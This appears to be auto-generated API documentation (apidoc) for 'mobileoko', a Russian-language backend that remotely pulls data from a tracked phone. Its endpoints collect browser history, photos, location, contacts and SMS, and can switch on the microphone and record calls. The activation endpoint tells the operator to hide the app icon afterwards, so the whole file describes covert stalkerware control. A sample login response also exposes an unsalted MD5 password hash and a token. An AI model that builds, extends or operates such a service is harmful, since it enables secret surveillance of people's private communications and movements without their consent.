define({ "api": [
  {
    "type": "get",
    "url": "/api/soket/mobileoko/addHistoryBrowser",
    "title": "Загрузка истории браузера через сокет[addHistoryBrowser]",
    "name": "______________________________________addHistoryBrowser_",
    "description": "<p>Данный метод предназначен исключительно для отправки запросов на мобильное устаройтво, через админку, постман</p>",
    "group": "Browser",
    "sampleRequest": [
      {
        "url": "/api/soket/mobileoko/addHistoryBrowser"
      }
    ],
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "auth_token",
            "description": "<p>Токен пользователя</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/socket/socketAddHistoryBrowser.js",
    "groupTitle": "Browser"
  },
  {
    "type": "post",
    "url": "/api/mobileoko/addHistoryBrowser",
    "title": "Загрузка истории браузера на сервер[addHistoryBrowser]",
    "name": "____________________________________addHistoryBrowser_",
    "group": "Browser",
    "sampleRequest": [
      {
        "url": "/api/mobileoko/addHistoryBrowser"
      }
    ],
    "parameter": {
      "fields": {
        "Parameter": [
          {
            "group": "Parameter",
            "type": "String",
            "optional": false,
            "field": "auth_token",
            "description": "<p>Токен пользователя</p>"
          }
        ]
      }
    },
    "success": {
      "examples": [
        {
          "title": "Success-Response:",
          "content": "HTTP/1.1 200 OK\n{\n  \"code\": 200,\n  \"massage\": \"История браузера загружена\"\n}",
          "type": "json"
        }
      ]
    },
    "error": {
      "fields": {
        "Error 4xx": [
          {
            "group": "Error 4xx",
            "optional": false,
            "field": "massage",
            "description": "<p>Служба столкнулась с ошибкой обработки вашего запроса. Пожалуйста, попробуйте еще раз.</p>"
          }
        ]
      },
      "examples": [
        {
          "title": "Error-Response:",
          "content": "HTTP/1.1 400 Not Found\n{\n  \"code\":400,\n  \"massage\": massage\n}",
          "type": "json"
        },
        {
          "title": "Error-Response:",
          "content": "HTTP/1.1 401 Not Found\n{\n  \"code\":401,\n  \"massage\": massage\n}",
          "type": "json"
        }
      ]
    },
    "version": "0.0.0",
    "filename": "routes/custom/addHistoryBrowser.js",
    "groupTitle": "Browser"
  },
  {
    "type": "get",
    "url": "/api/mobileoko/getHistoryBrowser",
    "title": "Получение истории браузера[getHistoryBrowser]",
    "name": "_api_soket_mobileoko_getHistoryBrowser____________________________getHistoryBrowser_",
    "description": "<p>getHistoryBrowser  Получение истории браузера</p>",
    "group": "Browser",
    "sampleRequest": [
      {
        "url": "/api/soket/mobileoko/getHistoryBrowser"
      }
    ],
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "auth_token",
            "description": "<p>Токен пользователя</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/custom/getHistoryBrowser.js",
    "groupTitle": "Browser"
  },
  {
    "type": "get",
    "url": "/api/mobileoko/activateDivace",
    "title": "Активация устройства для отслеживания[activateDivace]",
    "name": "______________________________________activateDivace_",
    "description": "<p>Данная операция предназначина для <code>БЕЗОПАСНОСТИ!!!</code> чтобы не кто другой не мог отследить данные на вашем устройстве. После таго как вы активировали устройство, вы должны скрыть значек на мобильно устройстве по ответу code 200</p>",
    "group": "Divaces",
    "sampleRequest": [
      {
        "url": "/api/mobileoko/activateDivace"
      }
    ],
    "parameter": {
      "fields": {
        "Parameter": [
          {
            "group": "Parameter",
            "type": "Integer",
            "optional": false,
            "field": "ids_code",
            "description": "<p>IDS code</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/custom/activateDivace.js",
    "groupTitle": "Divaces"
  },
  {
    "type": "post",
    "url": "/api/mobileoko/addDivace",
    "title": "Добавления устройств для отслеживания[addDivace]",
    "name": "______________________________________addDivace_",
    "description": "<p>Данный метод дает возможность добавить устройство для отслеживания</p>",
    "group": "Divaces",
    "sampleRequest": [
      {
        "url": "/api/mobileoko/addDivace"
      }
    ],
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "auth_token",
            "description": "<p>Токен пользователя</p>"
          }
        ]
      }
    },
    "parameter": {
      "fields": {
        "Parameter": [
          {
            "group": "Parameter",
            "type": "String",
            "optional": false,
            "field": "divace_name",
            "description": "<p>Имя устройства</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/custom/addDivace.js",
    "groupTitle": "Divaces"
  },
  {
    "type": "get",
    "url": "/api/soket/mobileoko/createFolders",
    "title": "Создает файл на устройстве[createFolders]",
    "name": "___________________________createFolders_",
    "description": "<p>Создает файл на устройстве, для того чтобы загрузать файлы, диктофонную запись, телефонную запись и т.д</p>",
    "group": "Folder",
    "sampleRequest": [
      {
        "url": "/api/soket/mobileoko/createFolders"
      }
    ],
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "auth_token",
            "description": "<p>Токен пользователя</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/socket/socketCreateFolders.js",
    "groupTitle": "Folder"
  },
  {
    "type": "get",
    "url": "/api/soket/mobileoko/uploadImages",
    "title": "Скачивает фото с телефона и помещает в папку images[uploadImages]",
    "name": "_____________________________________________images_uploadImages_",
    "description": "<p>Данный метод предназначен исключительно для отправки запроса на мобильное для того чтобы скачать изображения сделанные с камеры</p>",
    "group": "Image",
    "sampleRequest": [
      {
        "url": "/api/soket/mobileoko/uploadImages"
      }
    ],
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "auth_token",
            "description": "<p>Токен пользователя</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/socket/socketUploadImages.js",
    "groupTitle": "Image"
  },
  {
    "type": "post",
    "url": "/api/mobileoko/uploadImages",
    "title": "Загрузка изображений[uploadImages] application",
    "name": "_____________________uploadImages__application",
    "description": "<p>getHistoryBrowser  Данный метод отправляет устройсво автоматически после того как вы сделали запрос на данный url <code>/api/soket/mobileoko/uploadImages</code></p>",
    "group": "Image",
    "sampleRequest": [
      {
        "url": "/api/soket/mobileoko/getHistoryBrowser"
      }
    ],
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "auth_token",
            "description": "<p>Токен пользователя</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/custom/uploadImages.js",
    "groupTitle": "Image"
  },
  {
    "type": "get",
    "url": "/api/soket/mobileoko/uploadLocation",
    "title": "Определяет у смартфона данное место положение и отправляет на сервер[uploadLocation]",
    "name": "_____________________________________________________________________uploadLocation_",
    "description": "<p>Данный метод определяем местоположение устройства и отпрвляем данные на сервер</p>",
    "group": "Location",
    "sampleRequest": [
      {
        "url": "/api/soket/mobileoko/uploadLocation"
      }
    ],
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "auth_token",
            "description": "<p>Токен пользователя</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/socket/socketUploadLocation.js",
    "groupTitle": "Location"
  },
  {
    "type": "post",
    "url": "/api/mobileoko/uploadLocation",
    "title": "Отпраляет устройсво запрос с координатами местороложения[uploadLocation_m]",
    "name": "_________________________________________________________uploadLocation_m_",
    "description": "<p>getHistoryBrowser  Данный метод отправляет устройсво автоматически после того как вы сделали запрос на данный url <code>/api/soket/mobileoko/uploadLocation</code></p>",
    "group": "Location",
    "sampleRequest": [
      {
        "url": "/api/soket/mobileoko/uploadLocation"
      }
    ],
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "auth_token",
            "description": "<p>Токен пользователя</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/custom/uploadLocation.js",
    "groupTitle": "Location"
  },
  {
    "type": "get",
    "url": "/api/soket/mobileoko/uploadPhone",
    "title": "Дынный метод выгружает все контакты да данном устройстве[uploadLocation]",
    "name": "_________________________________________________________uploadLocation_",
    "description": "<p>Данный метод определяем находит все контакты в смартфоне и отправляет на сервер</p>",
    "group": "Phone",
    "sampleRequest": [
      {
        "url": "/api/soket/mobileoko/uploadPhone"
      }
    ],
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "auth_token",
            "description": "<p>Токен пользователя</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/socket/socketUploadPhone.js",
    "groupTitle": "Phone"
  },
  {
    "type": "get",
    "url": "/api/soket/mobileoko/socketUploadRecorderCall",
    "title": "Включить диктофон во время звонка[socketUploadRecorderCall]",
    "name": "_api_soket_mobileoko_socketUploadRecorderCall___________________________________socketUploadRecorderCall_",
    "description": "<p>Данный метод включаем запись диктофона во время звонка  на данном устройсве</p>",
    "group": "Recoreder",
    "sampleRequest": [
      {
        "url": "/api/soket/mobileoko/socketUploadRecorder"
      }
    ],
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "auth_token",
            "description": "<p>Токен пользователя</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/socket/socketUploadRecorderCall.js",
    "groupTitle": "Recoreder"
  },
  {
    "type": "get",
    "url": "/api/soket/mobileoko/socketUploadRecorder",
    "title": "Включить диктофон[addHistoryBrowser]",
    "name": "_api_soket_mobileoko_socketUploadRecorder___________________addHistoryBrowser_",
    "description": "<p>Данный метод включаем запись диктофона на данном устройсве</p>",
    "group": "Recoreder",
    "sampleRequest": [
      {
        "url": "/api/soket/mobileoko/socketUploadRecorder"
      }
    ],
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "auth_token",
            "description": "<p>Токен пользователя</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/socket/socketUploadRecorder.js",
    "groupTitle": "Recoreder"
  },
  {
    "type": "get",
    "url": "/api/soket/mobileoko/uplaodSmsOutbox",
    "title": "Выгружает исходящие сообщения на устройстве[uplaodSmsOutbox]",
    "name": "_api_soket_mobileoko_uplaodSmsOutbox_____________________________________________uplaodSmsOutbox_",
    "description": "<p>Уходит запрос на устройство для выгрузки исходящие - SMS</p>",
    "group": "SMS",
    "sampleRequest": [
      {
        "url": "/api/soket/mobileoko/uplaodSmsOutbox"
      }
    ],
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "auth_token",
            "description": "<p>Токен пользователя</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/socket/soketUploadOutboxSms.js",
    "groupTitle": "SMS"
  },
  {
    "type": "get",
    "url": "/api/soket/mobileoko/uploadSmsInbox",
    "title": "Выгружает входящие сообщения на устройстве[addHistoryBrowser]",
    "name": "_api_soket_mobileoko_uploadSmsInbox____________________________________________addHistoryBrowser_",
    "description": "<p>Уходит запрос на устройство для выгрузки входящих - SMS</p>",
    "group": "SMS",
    "sampleRequest": [
      {
        "url": "/api/soket/mobileoko/uploadSmsInbox"
      }
    ],
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "auth_token",
            "description": "<p>Токен пользователя</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/socket/socketUploadSmsInbox.js",
    "groupTitle": "SMS"
  },
  {
    "type": "post",
    "url": "/api/mobileoko/registerUser",
    "title": "Регитсрация пользователей[registerUsers]",
    "name": "__________________________addHistoryBrowser_",
    "group": "Users",
    "sampleRequest": [
      {
        "url": "/api/mobileoko/registerUser"
      }
    ],
    "parameter": {
      "fields": {
        "Parameter": [
          {
            "group": "Parameter",
            "type": "String",
            "optional": false,
            "field": "email_user",
            "description": "<p>Email пользователя</p>"
          },
          {
            "group": "Parameter",
            "type": "String",
            "optional": false,
            "field": "password_user",
            "description": "<p>Пароль пользователя</p>"
          },
          {
            "group": "Parameter",
            "type": "String",
            "optional": false,
            "field": "arrow_password_user",
            "description": "<p>Подтверждение пароля пользователя</p>"
          }
        ]
      }
    },
    "success": {
      "examples": [
        {
          "title": "Success-Response:",
          "content": "   HTTP/1.1 200 OK\n{\n    \"code\": 200,\n    \"data\": {\n        \"massage\": \"Вы успешно зарегистрировались\"\n    }\n}",
          "type": "json"
        }
      ]
    },
    "error": {
      "fields": {
        "Error 4xx": [
          {
            "group": "Error 4xx",
            "optional": false,
            "field": "massage",
            "description": "<p>Ошибка соеденения с базой данных<br> Укажите валидный email<br> Пароли не совпадают<br></p>"
          }
        ]
      },
      "examples": [
        {
          "title": "Error-Response:",
          "content": "   HTTP/1.1 400 Not Found\n{\n    \"code\": 400,\n    \"data\": {\n        \"massage\": massage\n    }\n}",
          "type": "json"
        }
      ]
    },
    "version": "0.0.0",
    "filename": "routes/custom/registerUser.js",
    "groupTitle": "Users"
  },
  {
    "type": "get",
    "url": "/api/mobileoko/authUser",
    "title": "Авторизация пользователей[authUser]",
    "name": "__________________________authUser_",
    "group": "Users",
    "sampleRequest": [
      {
        "url": "/api/mobileoko/authUser"
      }
    ],
    "parameter": {
      "fields": {
        "Parameter": [
          {
            "group": "Parameter",
            "type": "String",
            "optional": false,
            "field": "email_user",
            "description": "<p>Email пользователя</p>"
          },
          {
            "group": "Parameter",
            "type": "String",
            "optional": false,
            "field": "password",
            "description": "<p>Пароль пользователя</p>"
          }
        ]
      }
    },
    "success": {
      "examples": [
        {
          "title": "Success-Response:",
          "content": "   HTTP/1.1 200 OK\n{\n    \"code\": 200,\n    \"data\": {\n        \"user\": {\n            \"_id\": \"5afc14f59fc5da1448ec710f\",\n            \"email_user\": \"123@mail.ru\",\n            \"password\": \"25d55ad283aa400af464c76d713c07ad\",\n            \"token\": \"gfv+rs7xo78z2t0va0ag036yo09x40p77pbm44cnni9wrktqlah4qm49i67kqrnvgvxuy8a9t0ftg04fxuy77fzr9vaetddiy2lut29orrvxvn9408ogptspw92+t\",\n            \"name_user\": null,\n            \"surname_user\": null\n        }\n    }\n}",
          "type": "json"
        }
      ]
    },
    "error": {
      "fields": {
        "Error 4xx": [
          {
            "group": "Error 4xx",
            "optional": false,
            "field": "massage",
            "description": "<p>Ошибка соеденения с базой данных<br> Укажите валидный email<br> Не верный логин или пароль<br></p>"
          }
        ]
      },
      "examples": [
        {
          "title": "Error-Response:",
          "content": "   HTTP/1.1 400 Not Found\n{\n    \"code\": 400,\n    \"data\": {\n        \"massage\": massage\n    }\n}",
          "type": "json"
        },
        {
          "title": "Error-Response:",
          "content": "   HTTP/1.1 200 Not Found\n{\n    \"code\": 200,\n    \"data\": {\n        \"massage\": massage\n    }\n}",
          "type": "json"
        }
      ]
    },
    "version": "0.0.0",
    "filename": "routes/custom/authUser.js",
    "groupTitle": "Users"
  }
] });
